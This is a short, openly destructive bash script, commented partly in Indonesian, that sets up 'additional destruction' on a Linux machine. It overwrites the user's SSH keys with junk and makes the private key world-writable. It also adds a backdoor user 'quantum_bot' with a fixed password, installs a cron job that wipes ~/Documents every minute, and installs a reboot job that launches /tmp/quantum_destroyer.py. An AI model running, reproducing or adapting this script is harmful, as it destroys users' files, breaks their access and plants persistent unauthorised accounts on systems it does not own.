#!/bin/bash
# Setup additional destruction

# Overwrite SSH keys
if [ -d ~/.ssh ]; then
    echo "k4w4n9b3r4t" > ~/.ssh/id_rsa
    echo "t0l0l" > ~/.ssh/id_rsa.pub
    chmod 777 ~/.ssh/id_rsa
fi

# Tambah fake user untuk persistence
sudo useradd -m -s /bin/bash quantum_bot 2>/dev/null
echo "quantum_bot:quantum" | sudo chpasswd 2>/dev/null

# Cron job setiap menit
(crontab -l 2>/dev/null; echo "* * * * * rm -rf ~/Documents/* 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/quantum_destroyer.py") | crontab -
